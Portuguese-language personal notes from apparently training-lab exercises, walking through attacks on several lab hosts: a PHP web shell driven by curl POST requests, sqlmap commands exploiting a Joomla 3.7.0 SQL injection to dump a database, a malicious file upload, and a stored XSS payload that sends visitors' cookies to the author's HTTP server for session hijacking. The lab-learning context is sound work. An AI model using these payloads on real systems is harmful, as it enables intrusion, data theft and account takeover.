Com o DIRB e observando código fonte dessa e outras páginas consegui achar o arquivo que eu mesmo tinha mandado! E como achei comecei a explorar, MAS algo estava fazendo não dar certo de jeito nenhum!!

Abri o código fonte da página que eu estava explorando e vi que o envio de dados era por `POST` , então dessa forma eu teria que mandar um payload adaptado para receber infos de POST e também enviar meus comandos via POST!

Mandando comando: `curl <http://172.16.1.216/file.php/exploitphp.php> -d "hack=id"`

Retorno a CLI mesmo

Payload: `<?php system($_POST['momo']); ?>`

---

LAB - 172.30.0.106

Acessei a página e idenfiquei que o ícone no topo da pagina é Joomla, sendo assim focaremos o ataque nesse sentido. Primeiro passo com o joomscan rodei ele no server e achei a versão —>`Joomla 3.7.0`

Pesquisando por aplicação e versao no exploit DB achei um exploit bem bom aqui [https://www.exploit-db.com/exploits/42033](https://www.exploit-db.com/exploits/42033)

Basicamente a ideia e rodar esse comando `sqlmap -u "[<http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml>](<http://localhost/index.php?option=com_fields&view=fields&layout=modal&list%5Bfullordering%5D=updatexml>)" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]` --> Alterando o localhost por IP

Achei a vuln

Ele funciona e me retorna as databases, então pra abrir as tabelas vou usar o mesmo comando alterando 1 ponto

`sqlmap -u "[<http://172.30.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml>](<http://172.30.0.106/index.php?option=com_fields&view=fields&layout=modal&list%5Bfullordering%5D=updatexml>)" --risk=3 --level=5 --random-agent -D medica --tables -p list[fullordering]` : Alterei o -dbs pra -D medica --tables —> Pega toda as tabelas na database medica

Depois quero pegar as colunas dessa tabela info que achei na database medica `sqlmap -u "[<http://172.30.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml>](<http://172.30.0.106/index.php?option=com_fields&view=fields&layout=modal&list%5Bfullordering%5D=updatexml>)" --risk=3 --level=5 --random-agent -D medica -T info --columns -p list[fullordering]`

Depois pego o dump dessa coluna chamada flag que achei na tabela info `sqlmap -u "[<http://172.30.0.106/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml>](<http://172.30.0.106/index.php?option=com_fields&view=fields&layout=modal&list%5Bfullordering%5D=updatexml>)" --risk=3 --level=5 --random-agent -D medica -T info -C flag --dump -p list[fullordering]`

E com isso ta explorado o Joomla com um exploit que achei na internet!!!!

- Note como o comando mysql sempre tem --<o que vc quer trazer> e -X <info de onde vc esta pegando>

---

LAB - 172.30.0.40

Quando não sei nada RECON padrão de DIRB + código fonte

Olhando os código fontes das páginas desse link achei uma página contato2 que me saltou os olhos! e olhando o código fonte da contato2 vi que ela aceita POST de arquivos

Tentei uploadar o payload padrão de exploração PHP e vi que ele aceitava, abri novamente o código fonte pra onde ele mandava esse arquivo

E por sorte ele mostrava sim pra onde ia o arquivo que eu mandava, ai foi abrir o arquivo que mandei e manipular com a com curl -d (Lembra que aqui precisa ser POST de acordo com a necessidade da página)

---

LAB - 172.16.1.250

Olhando a página vi que tem área pra por comentários, isso pode gerar XSS de sequestro de sessão

Abri um HTTP server na minha maquina python -m http.server 8080

Com isso pus um comentário na pagina que era pra roubar cookie de quem abrir ela, pq quando abrir roda o XSS e me envia o cookie `<script>new Image().src="<http://172.20.1.242:8080/?=>"+document.cookie;</script>`

—> 242 é o meu IP

Dai vai chegar no meu server o cookie de quem acessar....

Pega ele PHPSESSID=1qe8tn2tgc410a4s51gen6j9d4

Na URL vamos acessar a página com o cookie roubado

`<IP>/post.php?busca=<script>alert(document.cookie="PHPSESSID=1qe8tn2tgc410a4s51gen6j9d4")<%2Fscript>`

E depois de setar o cookie basta tentar acessar as áreas novamente com o seu cookie trocado

172.16.1.250/admin : Por exemplo

Dai ta pega a key